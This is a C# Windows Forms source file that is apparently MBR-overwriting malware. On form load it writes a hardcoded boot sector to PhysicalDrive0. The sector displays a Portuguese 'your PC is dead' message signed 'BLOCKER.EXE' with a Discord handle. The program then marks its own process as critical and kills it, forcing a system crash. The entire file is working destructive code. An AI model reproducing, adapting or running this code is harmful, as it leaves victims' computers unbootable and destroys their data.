using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Blocker
{
    public partial class mbr : Form
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);



        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(string IpFileName, uint dwDesiredAcc, uint dwShareMode, IntPtr IpSecurityAttributes,
        uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32")]



        private static extern bool WriteFile(IntPtr hfile, byte[] IpBuffer, uint nNumberOfBytesToWrite,
            out uint IpNumberBytesWritten, IntPtr IpOverLapped);
        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;
        private const uint OpenExisting = 0x3;
        private const uint FileFlagDeleteOnClose = 0x40000000;
        private const uint MbrSize = 512u;
        public mbr()
        {
            InitializeComponent();
        }

        private async void mbr_Load(object sender, EventArgs e)
        {
            var mbrData = new byte[] {0xEB, 0x00, 0xB4, 0x06, 0x30, 0xC0, 0x31, 0xC9, 0xBA, 0x4F, 0x18, 0xB7, 0x40, 0xCD, 0x10, 0xBE,
0x2E, 0x7C, 0xB4, 0x09, 0xB9, 0x00, 0x10, 0xB0, 0x20, 0xB3, 0x04, 0xE8, 0x02, 0x00, 0xEB, 0xFE,
0xB7, 0x00, 0xAC, 0x3C, 0x00, 0x74, 0x06, 0xB4, 0x0E, 0xCD, 0x10, 0xEB, 0xF5, 0xC3, 0x4F, 0x50,
0x41, 0x21, 0x20, 0x4B, 0x4B, 0x4B, 0x4B, 0x4B, 0x4B, 0x4B, 0x4B, 0x4B, 0x4B, 0x4B, 0x4B, 0x4B,
0x4B, 0x4B, 0x4B, 0x4B, 0x4B, 0x0D, 0x0A, 0x20, 0x0D, 0x0A, 0x20, 0x0D, 0x0A, 0x20, 0x0D, 0x0A,
0x20, 0x0D, 0x0A, 0x20, 0x0D, 0x0A, 0x20, 0x0D, 0x0A, 0x53, 0x45, 0x55, 0x20, 0x50, 0x43, 0x20,
0x46, 0x4F, 0x49, 0x20, 0x4D, 0x4F, 0x52, 0x54, 0x4F, 0x20, 0x50, 0x4F, 0x52, 0x51, 0x55, 0x45,
0x20, 0x53, 0x45, 0x55, 0x20, 0x54, 0x45, 0x4D, 0x50, 0x4F, 0x20, 0x41, 0x43, 0x41, 0x42, 0x4F,
0x55, 0x21, 0x0D, 0x0A, 0x50, 0x4F, 0x52, 0x20, 0x49, 0x53, 0x53, 0x4F, 0x20, 0x53, 0x4F, 0x46,
0x52, 0x45, 0x55, 0x20, 0x41, 0x53, 0x20, 0x43, 0x4F, 0x4E, 0x53, 0x45, 0x51, 0x55, 0x45, 0x4E,
0x43, 0x49, 0x41, 0x53, 0x21, 0x0D, 0x0A, 0x20, 0x0D, 0x0A, 0x20, 0x0D, 0x0A, 0x3D, 0x3D, 0x3D,
0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D,
0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x50, 0x43, 0x20, 0x41, 0x53, 0x53, 0x49, 0x4E, 0x41,
0x44, 0x4F, 0x20, 0x50, 0x4F, 0x52, 0x20, 0x42, 0x4C, 0x4F, 0x43, 0x4B, 0x45, 0x52, 0x2E, 0x45,
0x58, 0x45, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D,
0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x3D, 0x0D, 0x0A, 0x20,
0x0D, 0x0A, 0x20, 0x0D, 0x0A, 0x20, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
0x20, 0x20, 0x7E, 0x7E, 0x42, 0x59, 0x20, 0x57, 0x41, 0x47, 0x55, 0x49, 0x4E, 0x48, 0x4F, 0x0D,
0x0A, 0x20, 0x0D, 0x0A, 0x20, 0x0D, 0x0A, 0x44, 0x49, 0x53, 0x43, 0x4F, 0x52, 0x44, 0x3A, 0x20,
0x77, 0x61, 0x67, 0x6E, 0x61, 0x6F, 0x35, 0x36, 0x31, 0x37, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
                OpenExisting, 0, IntPtr.Zero);
            WriteFile(mbr, mbrData, MbrSize, out uint IpNumberOfBytesWritten, IntPtr.Zero);
            await Task.Delay(2000);
            System.Diagnostics.Process.EnterDebugMode();
            RtlSetProcessIsCritical(1, 0, 0);
            System.Diagnostics.Process.GetCurrentProcess().Kill();
            Environment.Exit(-1);
        }
    }
}
